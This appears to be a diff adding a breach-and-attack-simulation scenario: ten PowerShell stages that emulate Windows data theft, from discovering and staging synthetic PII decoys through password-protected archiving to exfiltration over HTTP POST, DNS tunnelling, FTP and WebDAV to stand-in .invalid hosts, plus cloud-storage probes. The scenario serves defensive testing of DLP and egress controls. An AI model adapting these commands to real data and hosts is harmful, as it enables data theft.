@@ -1,0 +1,467 @@
+id: collection-staging-exfil
+name: Collection → Staging → Exfiltration Chain
+description: >
+  Ten-stage telemetry-safe emulation of the post-compromise data-theft lifecycle
+  on Windows: find sensitive data, stage it, compress it, and attempt to move it
+  off the endpoint through every common exfiltration channel. This is where most
+  BAS coverage is thin — organizations test the intrusion but never validate that
+  their DLP, egress filtering, and EDR catch the actual THEFT.
+
+  KILL CHAIN STAGES:
+    1. Sensitive Data Discovery — search for PII/finance-pattern files (T1083 / T1005)
+    2. Local Data Collection     — copy discovered files into a staging dir (T1074.001)
+    3. robocopy Staging          — bulk stage via robocopy (T1074.001)
+    4. Archive (Compress-Archive)— zip the staging dir natively (T1560.001)
+    5. Archive (external tool)   — 7-Zip / makecab archive if present (T1560.001)
+    6. HTTP(S) Exfil             — POST the archive to an RFC-6761 .invalid host (T1041 / T1048.003)
+    7. DNS Exfil                 — encode a chunk into DNS labels to .invalid (T1048.001)
+    8. FTP Exfil                 — attempt FTP upload to an unreachable host (T1048.003)
+    9. WebDAV Exfil              — attempt WebClient/net use to a WebDAV target (T1048)
+    10. Cloud Upload             — resolve/reach public cloud-storage endpoints (T1567.002)
+
+  SAFETY: All "sensitive" data is SYNTHETIC decoy content generated at runtime with
+  clearly fake values ([BAS-SIM] tagged, no real PII). Every exfil channel targets a
+  deterministic RFC-6761 .invalid domain (never routable) or is measured for egress
+  reachability only — NO real data ever leaves the host. Staging directory and all
+  decoy/archive files are deleted in cleanup. All steps [BAS-SIM-EXF] tagged.
+  PRODUCTION-SAFE: all ten stages run in telemetry mode. Windows only.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - staging
+  - exfiltration
+  - dlp
+  - data-theft
+  - egress
+  - t1083
+  - t1005
+  - t1074
+  - t1560
+  - t1041
+  - t1048
+  - t1567
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+  - command-and-control
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Sensitive Data Discovery (T1083 / T1005)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 1 — Sensitive Data Discovery (synthetic decoys) (T1083 / T1005)"
+    technique_id: T1083
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Creates a staging dir under %TEMP% and writes SYNTHETIC decoy files with clearly-fake PII/finance markers (fake PAN/Aadhaar/card patterns tagged [BAS-SIM], no real data), then recursively searches for finance/PII filename patterns. Read + synthetic write only. Generates Sysmon EID 11 (file create) and file-enumeration telemetry."
+    telemetry:
+      - "Sysmon EID 11: decoy files created under %TEMP%\\bas_exfil_<runid>"
+      - "EDR: recursive file search for *.pan/*aadhaar*/*statement* patterns"
+    detection:
+      - "DLP: creation/scan of files matching PAN/Aadhaar/card regex — content-inspection trigger"
+      - "EDR: broad recursive file enumeration by a script host — collection-precursor IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_exfil_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      # SYNTHETIC decoy content — clearly fake, [BAS-SIM] tagged, never real PII.
+      "[BAS-SIM] Synthetic PAN: ABCDE1234F | Fake customer record, not real data" | Out-File (Join-Path $work "customer_pan_records.txt") -Encoding utf8
+      "[BAS-SIM] Synthetic Aadhaar: 0000-0000-0000 | Test decoy only" | Out-File (Join-Path $work "aadhaar_export.csv") -Encoding utf8
+      "[BAS-SIM] Synthetic card: 4111-1111-1111-1111 exp 01/30 | DLP test decoy" | Out-File (Join-Path $work "bank_statement_q1.txt") -Encoding utf8
+      $found = Get-ChildItem -Path $work -Recurse -File -Include *pan*,*aadhaar*,*statement*,*card* -ErrorAction SilentlyContinue
+      Write-Output "EXEC T1083/T1005: staged $($found.Count) synthetic sensitive-data decoy(s) in $work and enumerated them by filename pattern. Data-discovery Stage 1. [BAS-SIM-EXF-S1]"
+      Write-Output "FAIL: Files matching PAN/Aadhaar/card/statement patterns were created and enumerated without a DLP content-inspection alert. Your DLP should flag files containing PAN/Aadhaar/card patterns at rest and on access — verify the decoys tripped content inspection."
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_exfil_*') -Recurse -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Local Data Collection / copy into staging (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 2 — Local Data Collection into Staging Directory (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Copies the synthetic decoys from Stage 1 into a dedicated 'staged' subfolder (native Copy-Item). Adversaries consolidate stolen data into one location before archiving. Synthetic data only. Generates Sysmon EID 11 (file create) for each copy."
+    telemetry:
+      - "Sysmon EID 11: file copies into %TEMP%\\bas_exfil_<runid>\\staged"
+      - "EDR: rapid consolidation of multiple sensitive files into one directory"
+    detection:
+      - "EDR: many-files-into-one-folder copy burst — staging IOC"
+      - "DLP: sensitive files aggregated into a single archive-candidate directory"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_exfil_$runId"
+      if (-not (Test-Path $work)) { New-Item -ItemType Directory -Path $work -Force | Out-Null; "[BAS-SIM] decoy" | Out-File (Join-Path $work 'decoy.txt') -Encoding utf8 }
+      $staged = Join-Path $work "staged"
+      New-Item -ItemType Directory -Path $staged -Force | Out-Null
+      $src = Get-ChildItem -Path $work -File -ErrorAction SilentlyContinue
+      foreach ($f in $src) { Copy-Item $f.FullName -Destination $staged -Force -ErrorAction SilentlyContinue }
+      $count = (Get-ChildItem -Path $staged -File -ErrorAction SilentlyContinue).Count
+      Write-Output "EXEC T1074.001: consolidated $count file(s) into staging directory $staged. Data-staging Stage 2. [BAS-SIM-EXF-S2]"
+      Write-Output "FAIL: Sensitive files were aggregated into a staging folder without an alert. Consolidating flagged files into one directory (an archive candidate) is a strong pre-exfil signal — ensure EDR/DLP correlate collection into staging."
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_exfil_*') -Recurse -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 3 — robocopy bulk staging (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 3 — robocopy Bulk Staging (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Uses robocopy to mirror the staging directory to a second local folder — the same LOLBin adversaries use for high-speed bulk collection. Synthetic data, local-to-local only. Generates Sysmon EID 1 (robocopy.exe) and EID 11 (file create)."
+    telemetry:
+      - "Sysmon EID 1: robocopy.exe /E (recursive copy)"
+      - "Sysmon EID 11: bulk file creation in the robocopy destination"
+    detection:
+      - "EDR: robocopy.exe copying user-data directories — Sigma proc_creation_win_robocopy_collection.yml"
+      - "SIEM: robocopy with /MIR or /E over sensitive paths — bulk collection IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_exfil_$runId"
+      $staged = Join-Path $work "staged"
+      if (-not (Test-Path $staged)) { New-Item -ItemType Directory -Path $staged -Force | Out-Null; "[BAS-SIM] decoy" | Out-File (Join-Path $staged 'decoy.txt') -Encoding utf8 }
+      $robo = Join-Path $work "robostage"
+      & robocopy.exe $staged $robo /E /NFL /NDL /NJH /NJS 2>&1 | Out-Null
+      $roboRan = Test-Path $robo
+      $count = if ($roboRan) { (Get-ChildItem -Path $robo -Recurse -File -ErrorAction SilentlyContinue).Count } else { 0 }
+      if ($roboRan) {
+        Write-Output "EXEC T1074.001: robocopy mirrored $count file(s) into $robo. Bulk-staging Stage 3. [BAS-SIM-EXF-S3]"
+        Write-Output "FAIL: robocopy bulk-staged sensitive files unblocked. robocopy /E over user data is a classic mass-collection LOLBin — ensure its use over sensitive directories is detected."
+      } else {
+        Write-Output "PASS: robocopy staging was blocked or unavailable — bulk collection LOLBin restricted. [BAS-SIM-EXF-S3]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_exfil_*') -Recurse -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 4 — Archive via Compress-Archive (T1560.001)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 4 — Native Archive via Compress-Archive (T1560.001)"
+    technique_id: T1560.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Compresses the staging directory into a .zip with the built-in Compress-Archive cmdlet. Adversaries archive collected data to shrink and obscure it before exfil. Synthetic data. Generates Sysmon EID 11 (zip file created) and PowerShell EID 4104."
+    telemetry:
+      - "Sysmon EID 11: <staging>.zip created"
+      - "PowerShell EID 4104: Compress-Archive of a sensitive directory"
+    detection:
+      - "EDR: Compress-Archive / zip creation over collected data — Sigma posh_ps_compress_archive.yml"
+      - "DLP: archive containing PAN/Aadhaar/card content — archive-inspection trigger"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_exfil_$runId"
+      $staged = Join-Path $work "staged"
+      if (-not (Test-Path $staged)) { New-Item -ItemType Directory -Path $staged -Force | Out-Null; "[BAS-SIM] decoy" | Out-File (Join-Path $staged 'decoy.txt') -Encoding utf8 }
+      $zip = Join-Path $work "exfil_bundle.zip"
+      Compress-Archive -Path (Join-Path $staged '*') -DestinationPath $zip -Force -ErrorAction SilentlyContinue
+      $made = Test-Path $zip
+      $size = if ($made) { (Get-Item $zip).Length } else { 0 }
+      if ($made) {
+        Write-Output "EXEC T1560.001: Compress-Archive produced $zip ($size bytes). Native archiving Stage 4. [BAS-SIM-EXF-S4]"
+        Write-Output "FAIL: A zip of the staged sensitive data was created unblocked. DLP should inspect INSIDE archives — verify the PAN/Aadhaar/card decoys are detected even once compressed, and that archiving of flagged data raises an alert."
+      } else {
+        Write-Output "PASS: archive creation was blocked or failed — archiving of collected data restricted. [BAS-SIM-EXF-S4]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_exfil_*') -Recurse -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 5 — Archive via external tool (7-Zip / makecab) (T1560.001)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 5 — External Archiver (7-Zip / makecab) (T1560.001)"
+    technique_id: T1560.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 40
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Attempts to archive the staging directory with 7-Zip (7z.exe) if installed, otherwise the built-in makecab.exe. Adversaries prefer 7-Zip for password-protected archives that evade content inspection. Synthetic data. Generates Sysmon EID 1 (7z.exe / makecab.exe)."
+    telemetry:
+      - "Sysmon EID 1: 7z.exe a / makecab.exe archiving a sensitive directory"
+      - "Sysmon EID 11: .7z / .cab archive created"
+    detection:
+      - "EDR: 7z.exe with -p (password) over user data — Sigma proc_creation_win_7zip_password_archive.yml"
+      - "DLP: password-protected archive creation — high-risk exfil-prep signal (content cannot be inspected)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_exfil_$runId"
+      $staged = Join-Path $work "staged"
+      if (-not (Test-Path $staged)) { New-Item -ItemType Directory -Path $staged -Force | Out-Null; "[BAS-SIM] decoy" | Out-File (Join-Path $staged 'decoy.txt') -Encoding utf8 }
+      $sevenZip = Get-Command 7z.exe -ErrorAction SilentlyContinue
+      if (-not $sevenZip) { $sevenZip = Get-Item "$env:ProgramFiles\7-Zip\7z.exe" -ErrorAction SilentlyContinue }
+      if ($sevenZip) {
+        $out = Join-Path $work "exfil_bundle.7z"
+        & $sevenZip.Source a -pInfected $out (Join-Path $staged '*') 2>&1 | Out-Null
+        $made = Test-Path $out
+        if ($made) {
+          Write-Output "EXEC T1560.001: 7-Zip created a PASSWORD-PROTECTED archive $out over staged data. External-archiver Stage 5. [BAS-SIM-EXF-S5]"
+          Write-Output "FAIL: 7-Zip produced an encrypted archive unblocked — its contents cannot be content-inspected by DLP. Password-protected archive creation over sensitive data should itself be a high-risk alert."
+        } else {
+          Write-Output "PASS: 7-Zip archiving was blocked or failed — external archiver restricted. [BAS-SIM-EXF-S5]"
+        }
+      } else {
+        $cab = Join-Path $work "exfil_bundle.cab"
+        $ddf = Join-Path $work "bas.ddf"
+        "[BAS-SIM] makecab fallback archive" | Out-File (Join-Path $staged 'cabsrc.txt') -Encoding utf8
+        & makecab.exe (Join-Path $staged 'cabsrc.txt') $cab 2>&1 | Out-Null
+        $made = Test-Path $cab
+        if ($made) {
+          Write-Output "EXEC T1560.001: 7-Zip absent — makecab.exe produced $cab over staged data. External-archiver Stage 5 (makecab fallback). [BAS-SIM-EXF-S5]"
+          Write-Output "FAIL: makecab.exe archived staged data unblocked. makecab is a LOLBin archiver used to stage data for exfil — its use over user data should be detected."
+        } else {
+          Write-Output "SKIP: neither 7-Zip nor makecab produced an archive in this context. [BAS-SIM-EXF-S5]"
+        }
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_exfil_*') -Recurse -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Stage 6 — HTTP(S) Exfiltration (T1041 / T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 6 — HTTP(S) POST Exfiltration to .invalid (T1041 / T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Attempts an HTTP POST of the synthetic archive to a deterministic RFC-6761 .invalid host (never routable). Measures whether the endpoint can reach an arbitrary outbound web destination for exfil. No real data leaves the host (the target does not resolve). Generates Sysmon EID 22 (DNS query) and EID 3 (outbound connection attempt)."
+    telemetry:
+      - "Sysmon EID 22: DNS query to bas-sim-exfil-<runid>.invalid"
+      - "Sysmon EID 3: outbound TCP attempt from powershell.exe"
+    detection:
+      - "Proxy/NGFW: outbound POST to an unknown/never-seen domain — egress-anomaly IOC"
+      - "DLP: outbound HTTP body containing PAN/Aadhaar/card content — inline blocking trigger"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $target = "http://bas-sim-exfil-$runId.invalid/upload"
+      $body = "[BAS-SIM-EXF-S6] synthetic exfil payload, not real data, run $runId"
+      $reached = $false
+      try {
+        $resp = Invoke-WebRequest -Uri $target -Method POST -Body $body -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop
+        $reached = $true
+      } catch {
+        $msg = $_.Exception.Message
+        # A name-resolution/connection failure is expected for .invalid. If instead we
+        # got an HTTP-level error, egress actually reached a resolver/proxy that answered.
+        if ($msg -match 'status code|remote server returned|The remote name could not be resolved') {
+          if ($msg -notmatch 'could not be resolved') { $reached = $true }
+        }
+      }
+      Write-Output "EXEC T1048.003: HTTP POST attempted to $target (RFC-6761 .invalid). outbound_reachable=$reached (expected: false). HTTP-exfil Stage 6. [BAS-SIM-EXF-S6]"
+      if ($reached) {
+        Write-Output "FAIL: The POST reached an outbound web path even for a .invalid domain — egress/DNS filtering let arbitrary web traffic out. A real exfil endpoint would succeed. Enforce a web proxy allowlist and DLP body inspection."
+      } else {
+        Write-Output "FAIL: powershell.exe was allowed to attempt an arbitrary outbound HTTP POST (blocked only because the host is unresolvable). Script hosts should not freely open outbound web sessions — verify egress control and that the attempt was logged/alerted. [BAS-SIM-EXF-S6]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 7 — DNS Exfiltration (T1048.001)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 7 — DNS Tunneling Exfiltration to .invalid (T1048.001)"
+    technique_id: T1048.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Encodes a synthetic data chunk into hex and issues DNS queries with the encoded data as subdomain labels of an RFC-6761 .invalid domain (the classic DNS-tunneling exfil pattern). No data leaves via a real channel. Generates Sysmon EID 22 (DNS query) with abnormally long/high-entropy labels."
+    telemetry:
+      - "Sysmon EID 22: DNS queries <hexchunk>.bas-sim-exfil-<runid>.invalid"
+      - "DNS server log: long, high-entropy subdomain labels — tunneling signature"
+    detection:
+      - "SIEM: DNS queries with long/high-entropy labels or high query volume to one parent domain — DNS-tunneling IOC"
+      - "DNS firewall: queries to .invalid / newly-observed domains should NXDOMAIN and alert"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $parent = "bas-sim-exfil-$runId.invalid"
+      $data = "[BAS-SIM] synthetic PAN ABCDE1234F"
+      $hex = -join ([System.Text.Encoding]::ASCII.GetBytes($data) | ForEach-Object { $_.ToString('x2') })
+      $anyResolved = $false
+      for ($i = 0; $i -lt $hex.Length; $i += 30) {
+        $chunk = $hex.Substring($i, [Math]::Min(30, $hex.Length - $i))
+        $q = "$chunk.$parent"
+        $out = & nslookup.exe $q 2>&1 | Out-String
+        if ($out -match 'Address:' -and $out -notmatch "can.t find|NXDOMAIN|Non-existent|no response|timed out") { $anyResolved = $true }
+      }
+      Write-Output "EXEC T1048.001: encoded synthetic data into DNS labels and issued tunneling queries under $parent. any_resolved=$anyResolved (expected: false). DNS-exfil Stage 7. [BAS-SIM-EXF-S7]"
+      if ($anyResolved) {
+        Write-Output "FAIL: DNS tunneling queries to a .invalid domain resolved — DNS RPZ/firewall is NOT filtering. Real DNS-tunneling exfil would succeed. Deploy DNS RPZ, alert on high-entropy/long-label queries, and block .invalid resolution."
+      } else {
+        Write-Output "FAIL: The endpoint freely issued high-entropy DNS-tunneling queries (returned NXDOMAIN only because the domain is .invalid). The QUERY PATTERN itself — long encoded labels, many queries to one parent — must be detected by your SIEM/DNS analytics. Verify Sysmon EID 22 detection fired. [BAS-SIM-EXF-S7]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 8 — FTP Exfiltration (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 8 — FTP Exfiltration Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Attempts an outbound FTP control-channel connection (TCP 21) to a deterministic RFC-6761 .invalid host. Legacy FTP exfil is still used because many egress policies overlook it. No data transferred (host unresolvable). Generates Sysmon EID 22 (DNS) and EID 3 (TCP 21 attempt)."
+    telemetry:
+      - "Sysmon EID 22: DNS query to ftp.bas-sim-exfil-<runid>.invalid"
+      - "Sysmon EID 3: outbound TCP/21 connection attempt"
+    detection:
+      - "NGFW: any outbound TCP/21 (FTP) egress — should be blocked by default; flag if allowed"
+      - "SIEM: FTP control channel to an external/unknown host — legacy-protocol exfil IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $ftpHost = "ftp.bas-sim-exfil-$runId.invalid"
+      $connected = $false
+      try {
+        $tcp = New-Object System.Net.Sockets.TcpClient
+        $iar = $tcp.BeginConnect($ftpHost, 21, $null, $null)
+        $connected = $iar.AsyncWaitHandle.WaitOne(6000, $false) -and $tcp.Connected
+        $tcp.Close()
+      } catch { $connected = $false }
+      Write-Output "EXEC T1048.003: FTP control-channel connect attempted to ${ftpHost}:21 (RFC-6761 .invalid). connected=$connected (expected: false). FTP-exfil Stage 8. [BAS-SIM-EXF-S8]"
+      if ($connected) {
+        Write-Output "FAIL: An outbound FTP (TCP/21) connection succeeded — legacy-protocol egress is not blocked. FTP is a common overlooked exfil channel. Block outbound FTP at the firewall and alert on any TCP/21 egress."
+      } else {
+        Write-Output "PASS: outbound FTP (TCP/21) egress was blocked or the host was unreachable — legacy-protocol exfil channel is closed. [BAS-SIM-EXF-S8]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 9 — WebDAV Exfiltration (T1048)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 9 — WebDAV Exfiltration Attempt (T1048)"
+    technique_id: T1048
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Attempts a WebDAV PUT via the WebClient service to an RFC-6761 .invalid host — WebDAV over HTTPS blends with normal web traffic and is a favored exfil channel. No data transferred (host unresolvable). Generates Sysmon EID 22 (DNS) and WebClient service activity."
+    telemetry:
+      - "Sysmon EID 22: DNS query to dav.bas-sim-exfil-<runid>.invalid"
+      - "EDR: WebClient (WebDAV) redirector activity / svchost outbound"
+    detection:
+      - "Proxy: WebDAV PUT/PROPFIND to an unknown external host — exfil-over-web IOC"
+      - "EDR: WebClient service starting to reach an external WebDAV share — Sigma net_connection_webdav.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $target = "http://dav.bas-sim-exfil-$runId.invalid/upload/bundle.zip"
+      $reached = $false
+      try {
+        $wc = New-Object System.Net.WebClient
+        [void]$wc.UploadString($target, "PUT", "[BAS-SIM-EXF-S9] synthetic webdav payload")
+        $reached = $true
+      } catch {
+        if ($_.Exception.Message -match 'status code|remote server returned') { $reached = $true }
+      }
+      Write-Output "EXEC T1048: WebDAV PUT attempted to $target (RFC-6761 .invalid). reached=$reached (expected: false). WebDAV-exfil Stage 9. [BAS-SIM-EXF-S9]"
+      if ($reached) {
+        Write-Output "FAIL: A WebDAV upload reached an outbound web path — WebDAV egress is not filtered. WebDAV blends into normal HTTPS and is a stealthy exfil channel. Restrict the WebClient service and enforce proxy inspection of PUT/PROPFIND."
+      } else {
+        Write-Output "PASS: WebDAV egress was blocked or unreachable — exfil-over-WebDAV channel is closed. [BAS-SIM-EXF-S9]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 10 — Cloud Storage Upload (T1567.002)
+  # ---------------------------------------------------------------------------
+  - name: "Exfil Stage 10 — Cloud Storage Egress Reachability (T1567.002)"
+    technique_id: T1567.002
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Tests whether the endpoint can reach public cloud-storage upload endpoints (a benign HEAD/connectivity probe to well-known storage hostnames) — the exfil-to-cloud path used by modern data theft. NO account, NO upload, NO data: connectivity reachability only. Generates Sysmon EID 22 (DNS) and EID 3 (outbound TLS attempt)."
+    telemetry:
+      - "Sysmon EID 22: DNS queries to public cloud-storage hostnames"
+      - "Sysmon EID 3: outbound TCP/443 to cloud-storage endpoints"
+    detection:
+      - "Proxy/CASB: uploads to unsanctioned cloud storage — DLP/CASB egress policy trigger"
+      - "SIEM: workstation reaching consumer cloud-storage APIs — shadow-IT / exfil IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $endpoints = @('storage.googleapis.com','s3.amazonaws.com','blob.core.windows.net','api.dropboxapi.com')
+      $reachable = @()
+      foreach ($e in $endpoints) {
+        try {
+          $tcp = New-Object System.Net.Sockets.TcpClient
+          $iar = $tcp.BeginConnect($e, 443, $null, $null)
+          if ($iar.AsyncWaitHandle.WaitOne(3000, $false) -and $tcp.Connected) { $reachable += $e }
+          $tcp.Close()
+        } catch {}
+      }
+      Write-Output "EXEC T1567.002: probed cloud-storage egress reachability. reachable=[$($reachable -join ', ')] (probe only, no upload). Cloud-exfil Stage 10. [BAS-SIM-EXF-S10]"
+      if ($reachable.Count -gt 0) {
+        Write-Output "FAIL: The endpoint can directly reach $($reachable.Count) public cloud-storage endpoint(s) on TCP/443 — a real data-theft path to unsanctioned storage. Route egress through a proxy/CASB that enforces a sanctioned-tenant allowlist and DLP upload inspection."
+      } else {
+        Write-Output "PASS: no direct egress to public cloud-storage endpoints — uploads are forced through a controlled path (or blocked). [BAS-SIM-EXF-S10]"
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_exfil_*') -Recurse -Force -ErrorAction SilentlyContinue
